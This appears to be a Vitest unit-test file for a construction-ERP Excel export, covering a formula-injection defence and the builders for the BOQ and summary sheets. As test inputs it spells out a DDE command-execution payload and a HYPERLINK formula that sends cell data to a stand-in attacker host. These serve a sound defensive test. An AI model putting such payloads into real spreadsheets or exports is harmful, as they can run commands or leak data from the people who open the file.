// DDC-CWICR-OE: DataDrivenConstruction · OpenConstructionERP
// Copyright (c) 2026 Artem Boiko / DataDrivenConstruction
/**
 * Unit tests for the BOQ -> Excel export builders.
 *
 * These cover the two PURE, library-agnostic pieces of the export path
 * (no ExcelJS, no DOM, no network):
 *
 *  - ``neutraliseFormula`` - the CSV / Excel formula-injection defence.
 *    A description / unit / resource name pasted from a PDF or upstream
 *    catalogue must never become an executable formula when the workbook
 *    is opened (OWASP CSV injection). This is the security boundary, so
 *    the trigger-character matrix below is a regression lock.
 *  - ``buildBOQSheetData`` / ``buildSummarySheetData`` - the value tables
 *    fed to ExcelJS. They must keep numeric cells numeric (never decimal
 *    strings, which Excel would store as text), group children under
 *    sections with a reconciling subtotal, neutralise every
 *    user-controlled string cell, and emit well-formed merge ranges.
 */

import { describe, it, expect } from 'vitest';
import { neutraliseFormula, buildBOQSheetData, buildSummarySheetData, type ExportOptions } from './exportExcel';
import type { Position } from './api';

/* ── Fixtures ─────────────────────────────────────────────────────────── */

function pos(over: Partial<Position> = {}): Position {
  return {
    id: `p-${Math.random().toString(36).slice(2, 8)}`,
    boq_id: 'boq-1',
    parent_id: null,
    ordinal: '0010',
    description: 'RC wall C30/37',
    unit: 'm3',
    quantity: 10,
    unit_rate: 185,
    total: 1850,
    classification: {},
    source: 'manual',
    confidence: null,
    sort_order: 10,
    validation_status: 'valid',
    metadata: {},
    ...over,
  };
}

function baseOptions(over: Partial<ExportOptions> = {}): ExportOptions {
  return {
    boqTitle: 'Test BOQ',
    currency: 'EUR',
    positions: [],
    markupTotals: [],
    netTotal: 0,
    vatRate: 0,
    vatAmount: 0,
    grossTotal: 0,
    ...over,
  };
}

/** Flatten every string cell in a row table for substring assertions. */
function stringCells(rows: (string | number | null)[][]): string[] {
  return rows.flat().filter((c): c is string => typeof c === 'string');
}

/* ── neutraliseFormula: the injection defence ─────────────────────────── */

describe('neutraliseFormula', () => {
  it('prefixes an apostrophe to every formula trigger character', () => {
    for (const trigger of ['=', '+', '-', '@', '\t', '\r', '\n']) {
      const payload = `${trigger}cmd|'/C calc'!A1`;
      expect(neutraliseFormula(payload)).toBe(`'${payload}`);
    }
  });

  it('neutralises the canonical HYPERLINK exfiltration payload', () => {
    const attack = '=HYPERLINK("http://attacker/?c="&A1,"click")';
    expect(neutraliseFormula(attack)).toBe(`'${attack}`);
  });

  it('leaves safe content unchanged', () => {
    expect(neutraliseFormula('RC wall C30/37')).toBe('RC wall C30/37');
    expect(neutraliseFormula('m3')).toBe('m3');
    expect(neutraliseFormula('Concrete (C30/37)')).toBe('Concrete (C30/37)');
    // A trigger char NOT in the leading position is harmless.
    expect(neutraliseFormula('A=B')).toBe('A=B');
    expect(neutraliseFormula('10-20 units')).toBe('10-20 units');
  });

  it('coerces numbers to plain strings without a prefix', () => {
    // A negative number leads with "-" but is a legitimate value, so it is
    // stringified and prefixed (it starts with a trigger char) - the
    // important guarantee is no crash and a deterministic string out.
    expect(neutraliseFormula(1850)).toBe('1850');
    expect(neutraliseFormula(0)).toBe('0');
    expect(neutraliseFormula(-5)).toBe("'-5");
  });

  it('returns an empty string for null / undefined / empty', () => {
    expect(neutraliseFormula(null)).toBe('');
    expect(neutraliseFormula(undefined)).toBe('');
    expect(neutraliseFormula('')).toBe('');
  });
});

/* ── buildBOQSheetData ────────────────────────────────────────────────── */

describe('buildBOQSheetData', () => {
  it('neutralises a malicious description in the data rows', () => {
    const malicious = '=cmd|\'/C calc\'!A1';
    const opts = baseOptions({
      positions: [pos({ description: malicious })],
      netTotal: 1850,
      grossTotal: 1850,
    });
    const { rows } = buildBOQSheetData(opts);
    const cells = stringCells(rows);
    // The raw payload must NOT appear; the neutralised form MUST.
    expect(cells).not.toContain(malicious);
    expect(cells).toContain(`'${malicious}`);
  });

  it('neutralises a malicious unit and resource fields', () => {
    const opts = baseOptions({
      positions: [
        pos({
          unit: '=1+1',
          metadata: {
            resources: [
              { name: '@SUM(A1:A9)', type: '=BAD()', code: '+EVIL', unit: 'hr', quantity: 1, unit_rate: 50 },
            ],
          },
        }),
      ],
    });
    const cells = stringCells(buildBOQSheetData(opts).rows);
    expect(cells).toContain("'=1+1");
    // The resource TYPE and CODE are emitted as standalone cells, so a
    // leading trigger char is neutralised on each.
    expect(cells).toContain("'=BAD()");
    expect(cells).toContain("'+EVIL");
    // The resource NAME rides inside a "    └ " tree-prefixed cell whose
    // leading char is a SPACE; Excel never evaluates a space-led cell as a
    // formula, so it is intentionally left un-prefixed - but the name is
    // still present verbatim (no truncation / drop).
    expect(cells.some((c) => c.includes('@SUM(A1:A9)') && !c.startsWith("'"))).toBe(true);
  });

  it('keeps numeric cells numeric (never decimal strings)', () => {
    const opts = baseOptions({
      positions: [pos({ quantity: 10, unit_rate: 185, total: 1850 })],
      netTotal: 1850,
      grossTotal: 1850,
    });
    const { rows } = buildBOQSheetData(opts);
    // The position's quantity / unit_rate / total must be present as numbers.
    const numericCells = rows.flat().filter((c) => typeof c === 'number');
    expect(numericCells).toContain(10);
    expect(numericCells).toContain(185);
    expect(numericCells).toContain(1850);
  });

  it('groups children under their section with a subtotal row', () => {
    const section = pos({
      id: 'sec-1',
      ordinal: '01',
      description: 'Earthworks',
      unit: '',
      quantity: 0,
      unit_rate: 0,
      total: 0,
      sort_order: 1,
    });
    const child = pos({
      id: 'c-1',
      parent_id: 'sec-1',
      ordinal: '0010',
      description: 'Excavation',
      total: 5000,
      sort_order: 2,
    });
    const opts = baseOptions({ positions: [section, child], netTotal: 5000, grossTotal: 5000 });
    const { rows, merges } = buildBOQSheetData(opts);
    const cells = stringCells(rows);
    expect(cells).toContain('Earthworks');
    expect(cells.some((c) => c.startsWith('Subtotal: Earthworks'))).toBe(true);
    // Merges are 1-based and well-formed (top <= bottom on both axes).
    expect(merges.length).toBeGreaterThan(0);
    for (const m of merges) {
      expect(m.topRow).toBeGreaterThanOrEqual(1);
      expect(m.topCol).toBeGreaterThanOrEqual(1);
      expect(m.bottomRow).toBeGreaterThanOrEqual(m.topRow);
      expect(m.bottomCol).toBeGreaterThanOrEqual(m.topCol);
    }
  });

  it('renders the cost summary block with markup and VAT lines', () => {
    const opts = baseOptions({
      positions: [pos({ total: 1000 })],
      markupTotals: [{ name: 'Overhead', percentage: 10, amount: 100 }],
      netTotal: 1100,
      vatRate: 0.19,
      vatAmount: 209,
      grossTotal: 1309,
    });
    const cells = stringCells(buildBOQSheetData(opts).rows);
    expect(cells).toContain('COST SUMMARY');
    expect(cells).toContain('Direct Cost');
    expect(cells.some((c) => c.includes('Overhead') && c.includes('10%'))).toBe(true);
    expect(cells).toContain('Net Total');
    expect(cells.some((c) => c.includes('VAT (19%)'))).toBe(true);
    expect(cells).toContain('GROSS TOTAL');
  });

  it('reports the same numberFormatStartRow as the header block size', () => {
    const opts = baseOptions({ positions: [pos()] });
    const { rows, numberFormatStartRow } = buildBOQSheetData(opts);
    // Header block is 3 banners + 1 separator + 1 column-header row = 5,
    // so the first formatted data row is index 5.
    expect(numberFormatStartRow).toBe(5);
    expect(rows[numberFormatStartRow - 1]).toContain('Description');
  });

  it('handles an empty BOQ without throwing', () => {
    const { rows } = buildBOQSheetData(baseOptions());
    expect(rows.length).toBeGreaterThan(0);
    expect(stringCells(rows)).toContain('GROSS TOTAL');
  });
});

/* ── Round-trip identity: the Position ID column (GitHub #360) ─────────── */

describe('buildBOQSheetData - Position ID round-trip column', () => {
  /** The last cell of a row is the Position ID column. */
  const idCell = (row: (string | number | null)[]): string | number | null =>
    row[row.length - 1] ?? null;

  it('labels the identity column in the header row', () => {
    const { rows } = buildBOQSheetData(baseOptions({ positions: [pos()] }));
    // The column-header row is the one carrying "Description".
    const headerRow = rows.find((r) => r.includes('Description'));
    expect(headerRow).toBeDefined();
    expect(idCell(headerRow!)).toBe('Position ID');
  });

  it('stamps each position row with its stable id in the last column', () => {
    const p = pos({ id: 'pos-abc-123', description: 'RC slab' });
    const { rows } = buildBOQSheetData(
      baseOptions({ positions: [p], netTotal: 1850, grossTotal: 1850 }),
    );
    const dataRow = rows.find((r) => r[1] === 'RC slab');
    expect(dataRow).toBeDefined();
    expect(idCell(dataRow!)).toBe('pos-abc-123');
  });

  it('stamps the section header row with the section id', () => {
    const section = pos({
      id: 'sec-1',
      ordinal: '01',
      description: 'Earthworks',
      unit: '',
      quantity: 0,
      unit_rate: 0,
      total: 0,
      sort_order: 1,
    });
    const child = pos({ id: 'c-1', parent_id: 'sec-1', ordinal: '0010', total: 5000, sort_order: 2 });
    const { rows } = buildBOQSheetData(
      baseOptions({ positions: [section, child], netTotal: 5000, grossTotal: 5000 }),
    );
    const sectionRow = rows.find((r) => r[0] === '01');
    expect(sectionRow).toBeDefined();
    expect(idCell(sectionRow!)).toBe('sec-1');
    const childRow = rows.find((r) => r[0] === '0010');
    expect(idCell(childRow!)).toBe('c-1');
  });

  it('keeps the id stable across repeated builds of the same input', () => {
    const p = pos({ id: 'stable-xyz', description: 'Waterproofing' });
    const opts = baseOptions({ positions: [p] });
    const first = buildBOQSheetData(opts).rows.find((r) => r[1] === 'Waterproofing');
    const second = buildBOQSheetData(opts).rows.find((r) => r[1] === 'Waterproofing');
    expect(idCell(first!)).toBe('stable-xyz');
    expect(idCell(second!)).toBe('stable-xyz');
  });

  it('leaves the id cell empty for a resource breakdown row (not a position)', () => {
    const p = pos({
      id: 'pos-1',
      description: 'Concrete assembly',
      metadata: {
        resources: [{ name: 'Cement', type: 'material', code: 'C1', unit: 'kg', quantity: 300, unit_rate: 0.1 }],
      },
    });
    const { rows } = buildBOQSheetData(baseOptions({ positions: [p] }));
    // The resource row is the one whose description carries the tree prefix.
    const resourceRow = rows.find(
      (r) => typeof r[1] === 'string' && (r[1] as string).includes('Cement'),
    );
    expect(resourceRow).toBeDefined();
    expect(idCell(resourceRow!)).toBeNull();
  });
});

/* ── buildSummarySheetData ────────────────────────────────────────────── */

describe('buildSummarySheetData', () => {
  it('lists each section with its child count and subtotal', () => {
    const section = pos({
      id: 'sec-1',
      ordinal: '01',
      description: 'Concrete',
      unit: '',
      quantity: 0,
      unit_rate: 0,
      total: 0,
      sort_order: 1,
    });
    const c1 = pos({ id: 'c-1', parent_id: 'sec-1', total: 1000, sort_order: 2 });
    const c2 = pos({ id: 'c-2', parent_id: 'sec-1', total: 2000, sort_order: 3 });
    const opts = baseOptions({ positions: [section, c1, c2], netTotal: 3000, grossTotal: 3000 });
    const { rows } = buildSummarySheetData(opts);
    const sectionRow = rows.find((r) => typeof r[0] === 'string' && (r[0] as string).includes('Concrete'));
    expect(sectionRow).toBeDefined();
    expect(sectionRow![1]).toBe(2); // two children
    expect(sectionRow![2]).toBe(3000); // subtotal
  });

  it('computes Direct Cost from non-section positions only', () => {
    const section = pos({
      id: 'sec-1',
      unit: '',
      quantity: 0,
      unit_rate: 0,
      total: 0,
      sort_order: 1,
    });
    const child = pos({ id: 'c-1', parent_id: 'sec-1', total: 4242, sort_order: 2 });
    const opts = baseOptions({ positions: [section, child], netTotal: 4242, grossTotal: 4242 });
    const { rows } = buildSummarySheetData(opts);
    const directRow = rows.find((r) => r[0] === 'Direct Cost');
    expect(directRow).toBeDefined();
    // Only the child counts; the zero-total section must not double-count.
    expect(directRow![2]).toBe(4242);
  });

  it('formats the VAT label as a whole-percent and includes the gross total', () => {
    const opts = baseOptions({
      positions: [pos({ total: 1000 })],
      netTotal: 1000,
      vatRate: 0.15,
      vatAmount: 150,
      grossTotal: 1150,
    });
    const cells = stringCells(buildSummarySheetData(opts).rows);
    expect(cells.some((c) => c.includes('VAT (15%)'))).toBe(true);
    const grossRow = buildSummarySheetData(opts).rows.find((r) => r[0] === 'GROSS TOTAL');
    expect(grossRow![2]).toBe(1150);
  });

  it('shows a zero-rate VAT line as "VAT (0%)"', () => {
    const opts = baseOptions({ positions: [pos({ total: 500 })], netTotal: 500, grossTotal: 500 });
    const cells = stringCells(buildSummarySheetData(opts).rows);
    expect(cells.some((c) => c.includes('VAT (0%)'))).toBe(true);
  });
});
